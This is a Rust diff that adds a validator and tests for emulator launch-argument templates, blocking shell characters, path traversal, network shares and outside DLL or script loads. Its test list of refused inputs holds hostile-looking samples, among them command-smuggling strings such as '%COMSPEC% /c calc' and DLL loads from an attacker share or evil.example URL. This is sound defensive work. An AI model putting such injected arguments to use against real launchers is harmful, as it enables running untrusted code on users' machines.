@@ -167,6 +167,100 @@ pub fn build_emulator_argv(template: &str, rom: &Path) -> Result<Vec<String>> {
     Ok(argv)
 }
 
+const PLACEHOLDERS: [&str; 3] = ["{rom}", "{romdir}", "{romname}"];
+/// Characters a shell would treat specially. No shell is ever used, but a template that needs
+/// them is almost certainly an attempt to run something else, so it is refused.
+const SHELL_CHARACTERS: [char; 7] = ['&', '|', '<', '>', '^', '%', '`'];
+
+/// Checks an emulator argument template that the renderer sent (`emulators_save`), on top of
+/// what [`build_emulator_argv`] already guarantees at launch (no shell, the ROM path is always
+/// exactly one argument).
+///
+/// The executable is fixed by the user's own pick, but arguments can still make a real
+/// emulator load other code (RetroArch's `-L <core.dll>`, script or config options). So every
+/// file path in the template must stay inside the emulator's own folder:
+/// - an absolute path (`C:\RetroArch\cores\x.dll`) must be inside the executable's folder;
+/// - a relative path (`cores\x.dll`, resolved from that folder, which is the working folder at
+///   launch) must start with a letter, digit, `_` or `.` and have no `..` segment;
+/// - network paths (`\\host\share`, `//host`), root-relative paths (`\x.dll`), drive-relative
+///   paths (`C:x.dll`), URLs and options with a path glued on (`-Lcores\x.dll`) are refused;
+/// - text that starts with a placeholder (`{romdir}\x.cfg`) is about the game file and may not
+///   contain `..`.
+///
+/// Each token is checked in parts split at `=` (`--core=cores\x.dll`). A part
+/// like `/fullscreen` (one leading `/`, no other separator) is an option, not a path. Control
+/// characters and [`SHELL_CHARACTERS`] are refused. A template without `{rom}` stays valid:
+/// the ROM path is then appended as the last argument.
+pub fn check_template(template: &str, executable: &str) -> Result<()> {
+    if template.chars().any(char::is_control) {
+        bail!(
+            "The emulator arguments can't contain tabs, line breaks or other control characters."
+        );
+    }
+    if let Some(c) = template.chars().find(|c| SHELL_CHARACTERS.contains(c)) {
+        bail!("The emulator arguments can't contain \"{c}\". Arguments are passed to the emulator directly, without a command prompt.");
+    }
+    let folder = Path::new(executable)
+        .parent()
+        .and_then(|p| crate::tracker::normalize_path(&p.to_string_lossy()))
+        .ok_or_else(|| anyhow!("The emulator executable must be a full path to an .exe file."))?;
+    for token in tokenize_template(template)? {
+        for piece in token.split('=') {
+            check_template_piece(piece, &folder).map_err(|reason| {
+                anyhow!("The emulator argument \"{token}\" is not allowed: {reason} Paths in the arguments must be inside the emulator's folder, like cores\\snes9x_libretro.dll.")
+            })?;
+        }
+    }
+    Ok(())
+}
+
+fn check_template_piece(piece: &str, folder: &str) -> Result<(), &'static str> {
+    let is_separator = |c: char| c == '\\' || c == '/';
+    let climbs = || piece.split(is_separator).any(|s| s.trim_end() == "..");
+    if piece.is_empty() {
+        return Ok(());
+    }
+    if PLACEHOLDERS.iter().any(|p| piece.starts_with(p)) {
+        return if climbs() {
+            Err("it leaves the game's folder with \"..\".")
+        } else {
+            Ok(())
+        };
+    }
+    if piece.contains(r"\\") || piece.contains("//") {
+        return Err("it names a network location.");
+    }
+    if piece.contains(':') {
+        let bytes = piece.as_bytes();
+        let absolute = bytes.len() > 3
+            && bytes[0].is_ascii_alphabetic()
+            && bytes[1] == b':'
+            && is_separator(bytes[2] as char)
+            && !piece[2..].contains(':');
+        if !absolute {
+            return Err("it has a \":\" that isn't part of a full path.");
+        }
+        return match crate::tracker::normalize_path(piece) {
+            Some(key) if !climbs() && crate::tracker::is_within(folder, &key) => Ok(()),
+            _ => Err("it points outside the emulator's folder."),
+        };
+    }
+    if !piece.contains(is_separator) {
+        return Ok(());
+    }
+    if piece.starts_with('/') && !piece[1..].contains(is_separator) {
+        return Ok(());
+    }
+    let first = piece.chars().next().unwrap_or(' ');
+    if !(first.is_alphanumeric() || first == '_' || first == '.') {
+        return Err("it is not a path inside the emulator's folder.");
+    }
+    if climbs() {
+        return Err("it leaves the emulator's folder with \"..\".");
+    }
+    Ok(())
+}
+
 /// The profile a ROM route launches with: its assigned profile, or (when none is assigned or
 /// the assigned one was deleted) the default for its system.
 pub fn emulator_for_route(
@@ -478,6 +572,73 @@ mod tests {
             build_emulator_argv("", path).unwrap(),
             [path.to_string_lossy()]
         );
+    }
+
+    #[test]
+    fn renderer_templates_keep_paths_inside_the_emulator_folder() {
+        let exe = r"D:\Emulators\RetroArch\retroarch.exe";
+        // Every catalog default passes, as do usual hand-written templates.
+        for known in crate::catalog::EMULATORS {
+            assert!(
+                check_template(known.default_args, exe).is_ok(),
+                "{}",
+                known.id
+            );
+        }
+        for good in [
+            "",
+            "{rom}",
+            "--fullscreen",
+            "/fullscreen {rom}",
+            r"-L cores\snes9x_libretro.dll {rom}",
+            r#"-L "cores\snes 9x_libretro.dll" "{rom}""#,
+            r"-L .\cores\mgba_libretro.dll {rom}",
+            "-L cores/mgba_libretro.dll {rom}",
+            r"-L D:\Emulators\RetroArch\cores\x.dll {rom}",
+            r"-L d:/emulators/retroarch/cores/x.dll {rom}",
+            r"--config=config\retroarch.cfg {rom}",
+            r"--path={rom} --dir={romdir} --name={romname}",
+            r"--cfg={romdir}\game.cfg",
+            "-C Dolphin.Display.Fullscreen=True -b -e {rom}",
+            "--set-volume=50",
+        ] {
+            assert!(check_template(good, exe).is_ok(), "{good} should pass");
+        }
+        for bad in [
+            // Code from outside the emulator's folder.
+            r"-L C:\Users\Me\Downloads\evil.dll {rom}",
+            r"-L D:\Emulators\Other\x.dll {rom}",
+            r"-L D:\Emulators\RetroArch\..\Other\x.dll {rom}",
+            r"-L D:\Emulators\RetroArchX\x.dll {rom}",
+            r"-L ..\evil.dll {rom}",
+            r"-L cores\..\..\evil.dll {rom}",
+            r"-L \evil.dll {rom}",
+            "-L /Users/me/evil.dll {rom}",
+            r"-L \\attacker\share\evil.dll {rom}",
+            "-L //attacker/share/evil.dll {rom}",
+            "-L C:evil.dll {rom}",
+            r"-LC:\evil.dll {rom}",
+            r"-L\evil.dll {rom}",
+            r"--core=C:\evil.dll {rom}",
+            r"--core=..\evil.dll {rom}",
+            r"-L D:\Emulators\RetroArch\cores\x.dll:stream {rom}",
+            "--script=https://evil.example/x.lua {rom}",
+            r"--cfg={romdir}\..\..\evil.cfg",
+            // Shell tricks and control characters.
+            "{rom} & calc.exe",
+            "{rom} | calc",
+            "{rom} > out.txt",
+            "%COMSPEC% /c calc",
+            "^& calc",
+            "`calc`",
+            "{rom}\ncalc.exe",
+            "{rom}\tx",
+            // Broken templates.
+            "\"{rom}",
+        ] {
+            assert!(check_template(bad, exe).is_err(), "{bad} should be refused");
+        }
+        assert!(check_template("{rom}", "retroarch.exe").is_err());
     }
 
     fn profile(exe: &Path) -> EmulatorProfile {
